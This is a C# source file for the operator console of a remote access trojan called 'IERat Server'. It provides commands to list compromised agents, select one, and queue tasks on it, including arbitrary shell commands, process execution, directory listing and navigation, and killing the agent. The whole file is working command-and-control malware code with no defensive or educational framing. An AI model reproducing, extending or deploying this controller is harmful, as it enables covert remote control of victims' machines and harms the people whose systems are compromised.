﻿using System;
using System.Threading;
using System.Threading.Tasks;
using NClap.Metadata;
using NClap.Repl;
using IERatServer.lib;
using Figgle;
using IERat.lib;
using NClap.Utilities;
using System.Drawing;
using Console = Colorful.Console;
using Colorful;

namespace IERatServer
{
    public class CLI
    {
        public static LoopInputOutputParameters ioParams = new()
        {
            Prompt = ColoredString.FromString("IERat# ")
        };
        public static Loop loop = new(typeof(MyCommandType), ioParams);
        public static int InteractContext = 1;
        public static int TimeOutSeconds = 30;
        enum MyCommandType
        {
            [Command(typeof(ListCommand), Description = "List Agents")]
            agents,

            [Command(typeof(ExecuteCommand), Description = "Execute a process")]
            exec,

            [Command(typeof(TimeoutCommand), Description = "Set the agents timeout in seconds")]
            timeout,

            [Command(typeof(pwdCommand), Description = "Execute a process")]
            pwd,

            [Command(typeof(lsCommand), Description = "List the current directory")]
            ls,

            [Command(typeof(cdCommand), Description = "Change the current directory")]
            cd,

            [Command(typeof(KillCommand), Description = "Kill the agent proces")]
            kill,

            [Command(typeof(ShellCommand), Description = "Run a shell command")]
            shell,

            [Command(typeof(InteractCommand), Description = "Interact with an agent")]
            interact,

            [Command(typeof(HistoryCommand), Description = "View task history")]
            history,

            [Command(typeof(ExitCommand), Description = "Exits the shell")]
            exit
        }

        class ListCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Console.ForegroundColor = Color.Yellow;
                Db.ListChannels();
                Console.ForegroundColor = Color.White;
                return Task.FromResult(CommandResult.Success);
            }
        }

        class ShellCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "a shell command to execute")]
            public string shellCommand { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("shell", shellCommand);
                return Task.FromResult(CommandResult.Success);
            }
        }

        class lsCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("ls");
                return Task.FromResult(CommandResult.Success);
            }
        }

        class TimeoutCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the number of seconds")]
            public int seconds { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                TimeOutSeconds = seconds;
                return Task.FromResult(CommandResult.Success);
            }
        }

        class cdCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "a directory path")]
            public string directory { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("cd", directory);
                return Task.FromResult(CommandResult.Success);
            }
        }
        class pwdCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("pwd");
                return Task.FromResult(CommandResult.Success);
            }
        }
        class HistoryCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Console.ForegroundColor = Color.Yellow;
                Db.ListTasks();
                Console.ForegroundColor = Color.White;
                return Task.FromResult(CommandResult.Success);
            }
        }

        class ExecuteCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the process path")]
            public string ProcessPath { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("execute", ProcessPath);
                return Task.FromResult(CommandResult.Success);
            }
        }
        class KillCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("kill");
                return Task.FromResult(CommandResult.Success);
            }
        }
        class InteractCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the agent number from the agents table")]
            public int AgentNumber { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                InteractContext = AgentNumber;
                if (Db.ChannelExists(AgentNumber)) {
                    Console.WriteLine($"\n---> Interacting with agent #{InteractContext}\n");
                    AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
                    var agent = ActiveChannel.agent;
                    if (ActiveChannel != null) {
                        loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
                    }
                }
                else { Colorful.Console.WriteLine("\n---> Bad ID number!\n"); }

                return Task.FromResult(CommandResult.Success);
            }
        }
        public static void RunInteractiveShell()
        {
            Console.WriteLine(Figgle.FiggleFonts.CyberLarge.Render("IERat Server"), Color.LightYellow);
            Console.WriteWithGradient("\t\t\t\tPowered by Internet Explorer!\t\n\n", Color.White, Color.LightSkyBlue, 24);
            loop.Execute();
        }
        public static void AddTaskToActiveAgent(string type, string args = "")
        {
            TaskObject taskObject = new()
            {
                Type = type,
                args = args,
                Time = DateTime.Now.ToString()
            };
            AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
            if (ActiveChannel != null) { ActiveChannel.agent.AgentTasks.Enqueue(taskObject); }
        }
    }
}
